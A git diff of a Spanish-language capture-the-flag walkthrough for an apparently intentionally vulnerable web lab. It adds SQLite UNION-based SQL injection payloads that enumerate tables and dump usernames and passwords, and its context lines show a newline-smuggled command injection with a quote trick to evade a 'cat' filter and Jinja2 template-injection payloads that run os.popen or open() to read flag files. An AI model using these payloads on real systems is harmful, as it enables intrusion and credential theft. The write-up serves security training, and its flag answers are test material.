@@ -126,16 +126,39 @@ Y devuelve el primer usuario de la tabla (super_user).
 
 Una vez dentro, ir a **Buscar**. El campo de búsqueda ejecuta:
 
+
 ```sql
 SELECT id, brand, model, price FROM sneakers WHERE brand LIKE '%INPUT%' OR model LIKE '%INPUT%'
 ```
+```sql 
+Ver nombre de base de datos
+' UNION SELECT 1,name,3,4,5,6 FROM pragma_database_list /*
 
+```
 ```sql
+Ver tablas de base de datos 
+' UNION SELECT 1,name,3,4,5,6 FROM sqlite_master WHERE type='table' /*
+
+```
+```sql
+Ver columnas de una tabla 
+' UNION SELECT 1,name,3,4,5,6 FROM pragma_table_info('users')
+
+```
+```sql
+Leer datos de una columna
+' UNION SELECT 1,username,password,4,5,6 FROM users /*
+```
+```sql
+Para encontrar la flag debe de buscar en la columna flag de la tabla secrets.
 cn' UNION SELECT 1, flag, 3, 4,5,6 FROM secrets /*
+
 ```
-```
+```text
 flag{sqli_filter_bypass}
+
 ```
+
 
 ### Schema de la base de datos
 
@@ -263,8 +286,6 @@ c'a't /flag.txt
 ```
 c'a't /flag.txt     ← válido en bash, elude el regex de "cat"
 ```
-
-`$` está bloqueado. En su lugar usar `%0A` como separador:
 ```
 target=8.8.8.8%0Ac'a't%20/flag.txt
 ```
@@ -334,13 +355,7 @@ El filtro bloquea `os` literal. Bypass con comillas que separan la cadena:
 {{ self.__init__.__globals__.__builtins__.__import__("os").popen('cat /home/app/flag.txt').read() }}
 ```
 
-**Método C — `cycler` globals (sin import)**
-```
-{{ cycler.__init__.__globals__.open('/home/app/flag.txt').read() }}
-```
-Este método ni siquiera necesita importar `os`. Usa el built-in `open()` directamente a través de los globals de Jinja2.
-
-**Método D — `lipsum` globals**
+**Método C — `lipsum` globals**
 ```
 {{ lipsum.__globals__['__builtins__']['open']('/home/app/flag.txt').read() }}
 ```
